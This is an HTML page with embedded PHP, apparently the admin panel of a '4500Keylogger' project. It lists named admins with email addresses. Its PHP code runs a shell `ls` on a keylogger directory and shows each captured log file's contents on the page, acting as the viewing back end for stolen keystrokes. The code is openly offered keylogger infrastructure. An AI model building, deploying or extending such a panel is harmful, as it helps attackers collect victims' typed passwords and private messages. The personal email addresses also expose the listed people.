<!DoCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <meta name="description" content="">
    <meta name="author" content="">
    <title>intaddpy</title>

    <!-- Bootstrap core CSS -->
    <link href="./static/dist/css/bootstrap.min.css " rel="stylesheet" >

    <!-- Custom styles for this template -->
    <link href="./static/starter-template.css" rel="stylesheet">

    <!-- Just for debugging purposes. Don't actually copy these 2 lines! -->
    <!--[if lt IE 9]><script src="../../assets/js/ie8-responsive-file-warning.js"></script><![endif]-->

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
  </head>

  <body role="document">
        <style type ="text/css">
                .jumbotron {
                        background-image: url("./static/img/1.png ");
                        background-size: cover;


                }

        </style>
    <nav class="navbar navbar-inverse navbar-fixed-top">
      <div class="container">
        <div class="navbar-header">
          <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
            <span class="sr-only">Toggle navigation</span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
           </button>
          <a class="navbar-brand" href="#">4500Keylogger</a>
        </div>
        <div id="navbar" class="collapse navbar-collapse">
          <ul class="nav navbar-nav">
            <li class="active"><a href="#">Home</a></li>
            <li><a href="#about">About</a></li>
            <li><a href="#contact">Contact</a></li>
          </ul>
        </div><!--/.nav-collapse -->
      </div>
    </nav>



   <div class="container theme-showcase" role="main">

      <!-- Main jumbotron for a primary marketing message or call to action -->
      <div class="jumbotron">
        <h1>Hello</h1>
      <p>Hello i'm 4500_Keylogger</p>
      <p>open_source Project </p>
        <p>admin site </p>

        </div>




      <div class="page-header">
        <h1>Admins</h1>
      </div>
        <div class ="row">
        <div class="col-md-12">
          <table class="table">
            <thead>
              <tr>
                <th>#</th>
                <th>Name</th>
                <th>Group</th>
                <th>Email</th>
              </tr>
            </thead>
            <tbody>
              <tr>
                <td>1</td>
                <td>intadd</td>
                <td>S.S.G</td>
                <td>intadd@naver.com</td>
              </tr>
            </tbody>
	 <tbody>
              <tr>
                <td>2</td>
                <td>S686</td>
                <td>SejongUv</td>
                <td>dksxogh0117@google.com</td>
              </tr>
            </tbody>
	<tbody>
	<tr>
                <td>3</td>
                <td>Mij9929</td>
                <td>SejongUv</td>
                <td>mij9929@naver.com</td>
              </tr>
            </tbody>

	<tr>
                <td>4</td>
                <td>pagekiller</td>
                <td>SejongUv</td>
                <td>pagekiller@naver.com</td>
              </tr>
            </tbody>
          </table>
        </div>
        </div>





<div class="page-header">
        <h1>Logginfo</h1>

</div>


<?php


$static='./keylogger/';
$data=str_replace("%0A","---",urlencode(shell_exec("ls ./keylogger/")));
$data=(str_replace("%0A","---",$data)).'-';
$filename='';

for ($i=0;$i<strlen($data)-2;$i++){
        if($data[$i]=='-'){
                if($data[$i+1]=='-'){
                        if($data[$i+2]=='-'){
                                echo"<h1>". $filename."</h1>";
      				$realname=$static.$filename;
                                $fp=fopen($realname,"r") or die("error");
                                $buffer=fread($fp,filesize($realname));
                                echo '<textarea class="form-control" placeholer="Message" rows="10" cols="50">'.htmlspecialchars($buffer).'</textarea>';
                                fclose($fp);


                                $i=$i+3;
                                $filename='';

                        }

                }
        }
        $filename=$filename.$data[$i];




}

?>


<h1>
<textarea class="form-control" placeholer="Message">
                                      </textarea>
</h1>
 <!-- Bootstrap core JavaScript
    ================================================== -->
    <!-- Placed at the end of the document so the pages load faster -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.2/jquery.min.js"></script>
    <script src="./static/dist/js/bootstrap.min.js"></script>
    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
    <script src="./static/assets/js/ie10-viewport-bug-workaround.js"></script>
  </body>
</html>


